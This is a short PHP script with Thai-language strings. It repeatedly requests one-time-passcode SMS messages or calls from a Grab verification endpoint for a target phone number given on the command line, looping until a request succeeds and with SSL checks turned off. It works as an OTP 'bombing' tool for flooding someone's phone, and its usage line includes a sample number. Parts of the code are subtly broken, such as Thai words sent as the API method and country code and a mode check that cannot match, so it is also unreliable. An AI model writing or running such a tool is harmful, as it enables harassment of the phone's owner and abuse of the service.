<?php
$argv[1] = substr($argv[1], 1);
$argv[1] = "66".$argv[1];

if (!isset($argv[1]) || (isset($argv[2]) && !in_array(strtoupper($argv[2]), ["ข้อความ", "โทร", "ทั้งหมด"]))) {
	echo "php run= <0926237952> <ข้อความ|โทร|ทั้งหมด>";
	exit;
} elseif (!isset($argv[2])) {
	$argv[2] = "ข้อความ";
}
$countries = ["ไทย"];
shuffle($countries);
$i = 0;
foreach ($countries as $countryCode) {
		$success = false;
		while (!$success) {
			foreach (["ข้อความ", "โทร"] as $method) {
				if (strtoupper($argv[2]) === "ALL" || strtoupper($argv[2]) === $method) {
					$result = @file_get_contents("https://api.grab.com/grabid/v1/phone/otp", false, stream_context_create([
						"http" => [
							"method" => "POST",
							"header" => "Content-type: application/x-www-form-urlencoded",
							"content" => "method=".$method."&countryCode=".$countryCode."&phoneNumber=".$argv[1]."&templateID=&numDigits=4"
						],
						"ssl" => [
							"verify_peer" => false,
							"verify_peer_name" => false
						]
					]));
					if ($result) {
						echo "[WHITE] หมายเลข: ".$argv[1]." ประเทศ: ".$countryCode." โหมดที่ใช้ยิง: ".$method."\n";
						$success = true;
					}
				}
			}
		}
	}

?>
